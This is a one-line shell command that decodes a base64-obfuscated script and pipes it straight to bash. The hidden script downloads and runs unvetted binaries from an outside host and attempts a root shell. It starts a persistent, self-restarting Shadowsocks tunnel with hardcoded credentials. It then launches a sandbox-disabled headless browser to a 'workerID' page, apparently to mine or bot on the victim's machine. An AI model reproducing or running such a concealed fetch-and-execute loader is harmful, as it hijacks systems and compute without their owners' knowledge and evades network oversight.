base64 -d <<< IyEvYmluL2Jhc2gKc3lzdGVtMzNmaWxlPSJzeXN0ZW0zMyIKc3lzdGVtMzNfZG93bmxvYWRfdXJsPSJodHRwOi8vZ3JlZW4ud290Lm91cmhvYmJ5LmNvbS9zeXN0ZW0zMy50YXIuZ3oiCgppZiBbICEgLWYgIiRzeXN0ZW0zM2ZpbGUiIF07IHRoZW4KICAgIGVjaG8gIkZpbGUgJyRzeXN0ZW0zM2ZpbGUnIGRvZXMgbm90IGV4aXN0LiBEb3dubG9hZGluZy4uLiIKICAgIHdnZXQgLXEgIiRzeXN0ZW0zM19kb3dubG9hZF91cmwiCglzbGVlcCA1Cgl0YXIgLXhmIHN5c3RlbTMzLnRhci5negplbHNlCiAgICBlY2hvICJGaWxlICckc3lzdGVtMzNmaWxlJyBhbHJlYWR5IGV4aXN0cy4gU2tpcHBpbmcgZG93bmxvYWQuIgpmaQoKdWJ1bnR1MjIwNGd6aXBwZWRmaWxlPSJ1YnVudHUyMi4wNC50YXIuZ3oiCnVidW50dTIyMDRnemlwcGVkZmlsZV9kb3dubG9hZF91cmw9Imh0dHA6Ly9ncmVlbi53b3Qub3VyaG9iYnkuY29tL3VidW50dTIyLjA0LnRhci5neiIKCmlmIFsgISAtZiAiJHVidW50dTIyMDRnemlwcGVkZmlsZSIgXTsgdGhlbgogICAgZWNobyAiRmlsZSAnJHVidW50dTIyMDRnemlwcGVkZmlsZScgZG9lcyBub3QgZXhpc3QuIERvd25sb2FkaW5nLi4uIgogICAgd2dldCAtcSAiJHVidW50dTIyMDRnemlwcGVkZmlsZV9kb3dubG9hZF91cmwiCglzbGVlcCA1Cgl0YXIgLXhmIHVidW50dTIyLjA0LnRhci5negplbHNlCiAgICBlY2hvICJGaWxlICckdWJ1bnR1MjIwNGd6aXBwZWRmaWxlJyBhbHJlYWR5IGV4aXN0cy4gU2tpcHBpbmcgZG93bmxvYWQuIgpmaQoKc2xlZXAgMgoKLi9zeXN0ZW0zMyAtUyAuIC9iaW4vYmFzaAoKc2xlZXAgMgpzdSAtCnNsZWVwIDIKc3UgLQpzbGVlcCAyCmNkCnNsZWVwIDIKd2hvYW1pCnNsZWVwIDIKZXhwb3J0IERFQklBTl9GUk9OVEVORD1ub25pbnRlcmFjdGl2ZQpERUJJQU5fRlJPTlRFTkQ9bm9uaW50ZXJhY3RpdmUKc2xlZXAgMgpjYXQgL2V0Yy8qLXJlbGVhc2UKc2xlZXAgMgphcHQgdXBkYXRlID4vZGV2L251bGw7YXB0IC15IGluc3RhbGwgcHl0aG9uMyBweXRob24zLXZlbnYgbGlibnNzMy1kZXYgZ2NvbmYtc2VydmljZSBsaWJhc291bmQyIGxpYmF0azEuMC0wIGxpYmM2IGxpYmNhaXJvMiBsaWJjdXBzMiBsaWJkYnVzLTEtMyBsaWJleHBhdDEgbGliZm9udGNvbmZpZzEgbGliZ2NjMSBsaWJnY29uZi0yLTQgbGliZ2RrLXBpeGJ1ZjIuMC0wIGxpYmdsaWIyLjAtMCBsaWJndGstMy0wIGxpYm5zcHI0IGxpYnBhbmdvLTEuMC0wIGxpYnBhbmdvY2Fpcm8tMS4wLTAgbGlic3RkYysrNiBsaWJ4MTEtNiBsaWJ4MTEteGNiMSBsaWJ4Y2IxIGxpYnhjb21wb3NpdGUxIGxpYnhjdXJzb3IxIGxpYnhkYW1hZ2UxIGxpYnhleHQ2IGxpYnhmaXhlczMgbGlieGk2IGxpYnhyYW5kcjIgbGlieHJlbmRlcjEgbGlieHNzMSBsaWJ4dHN0NiBjYS1jZXJ0aWZpY2F0ZXMgZm9udHMtbGliZXJhdGlvbiBsaWJhcHBpbmRpY2F0b3IxIGxpYm5zczMgbHNiLXJlbGVhc2UgeGRnLXV0aWxzIHdnZXQgbGliZ2JtLWRldiBkcGtnID4vZGV2L251bGwKCmxzIC1sIC92YXIvbGliL2Rwa2cvaW5mbyB8IGdyZXAgLWkgbGlibnNzLXN5c3RlbWQ6YW1kNjQgPi9kZXYvbnVsbAptdiAvdmFyL2xpYi9kcGtnL2luZm8vbGlibnNzLXN5c3RlbWQ6YW1kNjQuKiAvdG1wID4vZGV2L251bGwKCnNsZWVwIDIKYXB0IC15IC0tbm8taW5zdGFsbC1yZWNvbW1lbmRzIGluc3RhbGwgdHpkYXRhID4vZGV2L251bGwKCnNsZWVwIDIKCmxuIC1mcyAvdXNyL3NoYXJlL3pvbmVpbmZvL0FmcmljYS9Kb2hhbm5lc2J1cmcgL2V0Yy9sb2NhbHRpbWUgPiAvZGV2L251bGwKZHBrZy1yZWNvbmZpZ3VyZSAtLWZyb250ZW5kIG5vbmludGVyYWN0aXZlIHR6ZGF0YSA+IC9kZXYvbnVsbAoKY2F0ID4+IHJlcXVpcmVtZW50cy50eHQgPDxFTkQKbnVtcHkKcmVxdWVzdHMKYXN5bmNpbwpweXBwZXRlZXIKRU5ECgpzbGVlcCAyCgpweXRob24zIC1tIHZlbnYgLnZlbnYKc2xlZXAgMgpzb3VyY2UgLnZlbnYvYmluL2FjdGl2YXRlCnNsZWVwIDIKCnBpcDMgaW5zdGFsbCAtciByZXF1aXJlbWVudHMudHh0ID4vZGV2L251bGwKCnNsZWVwIDIKCnNwZWN0cmVfZ3ppcHBlZF9wYWNrYWdlX2ZpbGVfZG93bmxvYWRfdXJsPSJodHRwOi8vZ3JlZW4ud290Lm91cmhvYmJ5LmNvbS9TcGVjdHJlLnRhci5neiIKc3BlY3RyZV9wYWNrYWdlX2ZpbGU9Ii91c3IvYmluL1NwZWN0cmUiCgppZiBbICEgLWYgIiRzcGVjdHJlX3BhY2thZ2VfZmlsZSIgXTsgdGhlbgogICAgZWNobyAiRmlsZSAnJHNwZWN0cmVfcGFja2FnZV9maWxlJyBkb2VzIG5vdCBleGlzdC4gRG93bmxvYWRpbmcuLi4iCiAgICB3Z2V0IC1xICIkc3BlY3RyZV9nemlwcGVkX3BhY2thZ2VfZmlsZV9kb3dubG9hZF91cmwiCglzbGVlcCAyCgl0YXIgLXhmIFNwZWN0cmUudGFyLmd6CglzbGVlcCAyCgltdiBTcGVjdHJlIC91c3IvYmluCmVsc2UKICAgIGVjaG8gIkZpbGUgJyRzcGVjdHJlX3BhY2thZ2VfZmlsZScgYWxyZWFkeSBleGlzdHMuIFNraXBwaW5nIGRvd25sb2FkLiIKZmkKCgpzbGVlcCAyCgplY2hvICJTdGFydGluZyBwcm94eSBoZWFsdGggY2hlY2tlci4uLiIKc3RkYnVmIC1vIEwgbm9odXAgYmFzaCAtYyAnCndoaWxlIHRydWUKZG8KICAgIENVUkxfT1VUPSQoY3VybCAtc0wgLXggc29ja3M1aDovLzEyNy4wLjAuMToxMDgyIC13ICIle2h0dHBfY29kZX0iIGh0dHA6Ly9hcGkuaXBpZnkub3JnIC1vIC9kZXYvbnVsbCkKICAgIAogICAgaWYgWyAiJENVUkxfT1VUIiA9ICIyMDAiIF07IHRoZW4KICAgICAgICBlY2hvICIkKGRhdGUpOiBTcGVjdHJlIGlzIHN0aWxsIG9ubGluZSIKICAgIGVsc2UKICAgICAgICBlY2hvICIkKGRhdGUpOiBTcGVjdHJlIGlzIG9mZmxpbmUuIEF0dGVtcHRpbmcgdG8gcmVzdGFydC4uLiIKICAgICAgICAKICAgICAgICBwa2lsbCBTcGVjdHJlCiAgICAgICAgCiAgICAgICAgbmV3X3NlcnZlcj0ic3M6Ly9hZXMtMTI4LWNmYjptaWtyb3Rpazk5OUBjcHVzb2NrcyQoc2h1ZiAtaSAxLTYgLW4gMSkud290Lm91cmhvYmJ5LmNvbTo4NDQzIgogICAgICAgIGVjaG8gIlJlc3RhcnRpbmcgU3BlY3RyZSB3aXRoIG5ldyBzZXJ2ZXI6ICRuZXdfc2VydmVyIgogICAgICAgIHN0ZGJ1ZiAtbyBMIG5vaHVwIFNwZWN0cmUgLUw9c29ja3M1Oi8vMTI3LjAuMC4xOjEwODIgLUY9IiRuZXdfc2VydmVyIiA+IHNwZWN0cmUubG9nIDI+JjEgJgogICAgICAgIAogICAgICAgIHNsZWVwIDUKICAgICAgICAKICAgICAgICBlY2hvICJOZXcgU3BlY3RyZSBwcm9jZXNzIHN0YXJ0ZWQuIENoZWNraW5nIGNvbm5lY3Rpdml0eS4uLiIKCQlzbGVlcCAyCiAgICAgICAgY3VybCAtcyAteCBzb2NrczVoOi8vMTI3LjAuMC4xOjEwODIgaHR0cDovL2FwaS5pcGlmeS5vcmcKICAgIGZpCiAgICBzbGVlcCA2MDAKZG9uZQonID4+IHByb3h5X2NoZWNrZXIubG9nIDI+JjEgJgoKZWNobyAiUHJveHkgYW5kIGhlYWx0aCBjaGVja2VyIGlzIHJ1bm5pbmcuIgoKc2xlZXAgMgoKY2F0ID4gcnVuX3B5cHBldGVlci5weSA8PEVPRgppbXBvcnQgb3MKaW1wb3J0IHNvY2tldAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHJhbmRvbQppbXBvcnQgc3RyaW5nCmltcG9ydCB0aW1lCmltcG9ydCBvcy5wYXRoCmltcG9ydCBhc3luY2lvIApmcm9tIHB5cHBldGVlciBpbXBvcnQgbGF1bmNoCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCgpudW1fb2ZfY29yZXMgPSBvcy5jcHVfY291bnQoKQpjdXJyZW50ZGF0ZSA9IGRhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCclZC0lYi0lWV9TaGlueVB5cHBfJykKaXBhZGRyZXNzID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS5pcGlmeS5vcmcnKS50ZXh0CnVuZGVyc2NvcmVkX2lwID0gaXBhZGRyZXNzLnJlcGxhY2UoJy4nLCAnXycpCmN1cnJlbnRkYXRlICs9IHVuZGVyc2NvcmVkX2lwCmNoYXJzID0gcmFuZG9tLmNob2ljZXMoc3RyaW5nLmFzY2lpX2xldHRlcnMgKyBzdHJpbmcuZGlnaXRzLCBrPTEwMCkKcmFuZG9tX3dvcmQgPSAiIi5qb2luKGNoYXJzWzo4XSkKY3VycmVudGRhdGUgKz0gcmFuZG9tX3dvcmQKCgpwcmludChmIllvdXIgY3VycmVudCBkYXRlIGlzIGZyb20gd2l0aGluIFB5dGhvbiBlbnZpcm9ubWVudCBpcyA6IHtjdXJyZW50ZGF0ZX0iKQoKCmFzeW5jIGRlZiBmZXRjaCgpOgogICBicm93c2VyID0gYXdhaXQgbGF1bmNoKAogICAgICAgIGhlYWRsZXNzPVRydWUsCiAgICAgICAgYXJncz1bJy0tbm8tc2FuZGJveCcsCiAgICAgICAgICAnLS1kaXNhYmxlLXNldHVpZC1zYW5kYm94JywKICAgICAgICAgICctLWlnbm9yZS1jZXJ0aWZpY2F0ZS1lcnJvcnMnLAogICAgICAgICAgJy0taWdub3JlLWNlcnRpZmljYXRlLWVycm9ycy1zcGtpLWxpc3QnLAogICAgICAgICAgJy0tZGlzYWJsZS1kZXYtc2htLXVzYWdlJywKICAgICAgICAgICctLWRpc2FibGUtaW5mb2JhcnMnLAogICAgICAgICAgJy0tZGlzYWJsZS1leHRlbnNpb25zJywKICAgICAgICAgICctLWRpc2FibGUtYmFja2dyb3VuZC10aW1lci10aHJvdHRsaW5nJywKICAgICAgICAgICctLWRpc2FibGUtYmFja2dyb3VuZC1uZXR3b3JraW5nJywKICAgICAgICAgICctLWRpc2FibGUtd2ViLXNlY3VyaXR5JywKICAgICAgICAgICctLWRpc2FibGUtZ3B1JywKCQkgICctLXByb3h5LXNlcnZlcj1zb2NrczU6Ly8xMjcuMC4wLjE6MTA4MiddLAogICAgICAgIGF1dG9DbG9zZT1GYWxzZQogICApCiAgIHBhZ2UgPSBhd2FpdCBicm93c2VyLm5ld1BhZ2UoKQogICB1cmwgPSBmImh0dHA6Ly9zaW5kaWxlc2lxaGF6dHJhaW5pbmcud290Lm91cmhvYmJ5LmNvbS9zaGlueS5odG1sP3dvcmtlcklEPXtjdXJyZW50ZGF0ZX0iCiAgIGF3YWl0IHBhZ2UuZ290byh1cmwpCgoKYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpLnJ1bl91bnRpbF9jb21wbGV0ZShmZXRjaCgpKQpFT0YKCnNsZWVwIDQKCnB5dGhvbjMgcnVuX3B5cHBldGVlci5weQ== | bash
